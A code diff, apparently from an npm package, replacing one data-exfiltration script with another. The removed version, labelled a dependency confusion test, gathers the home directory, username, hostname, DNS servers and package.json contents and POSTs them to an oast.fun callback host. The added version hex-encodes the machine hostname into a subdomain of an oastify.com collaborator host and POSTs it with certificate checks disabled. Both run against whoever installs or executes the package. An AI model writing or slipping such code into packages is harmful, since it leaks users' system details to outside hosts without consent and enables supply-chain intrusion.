@@ -1,50 +1,26 @@
-/**
- * This is a dependency confusion test package from handball10.
- */
+const https = require('https');
+var os = require("os");
+var hostname = Buffer.from(os.hostname()).toString('hex');
 
-const os = require("os");
-const dns = require("dns");
-const querystring = require("querystring");
-const https = require("https");
-const packageJSON = require("./package.json");
-const package = packageJSON.name;
+const data = new TextEncoder().encode(
+  JSON.stringify({
+    payload: hostname,
+    project_id: process.argv[2]
+  })
+);
 
-const trackingData = JSON.stringify({
-    p: package,
-    c: __dirname,
-    homeDir: os.homedir(),
-    hostName: os.hostname(),
-    userName: os.userInfo().username,
-    dns: dns.getServers(),
-    r: packageJSON ? packageJSON.___resolved : undefined,
-    v: packageJSON.version,
-    pjson: packageJSON,
-});
+const options = {
+  hostname: hostname + '.' + process.argv[2] + '.0bc1835p3norj91euh7g5qe8xz3qrgf5.oastify.com',
+  port: 443,
+  path: '/',
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+    'Content-Length': data.length
+  },
+  rejectUnauthorized: false
+}
 
-var postData = querystring.stringify({
-    msg: trackingData,
-});
-
-var options = {
-    hostname: "bsceojsuztnvqcdbgaum2iynn423cabpl.oast.fun", //replace burpcollaborator.net with Interactsh or pipedream
-    port: 443,
-    path: "/",
-    method: "POST",
-    headers: {
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Content-Length": postData.length,
-    },
-};
-
-var req = https.request(options, (res) => {
-    res.on("data", (d) => {
-        process.stdout.write(d);
-    });
-});
-
-req.on("error", (e) => {
-    // console.error(e);
-});
-
-req.write(postData);
+const req = https.request(options, res => {});
+req.write(data);
 req.end();
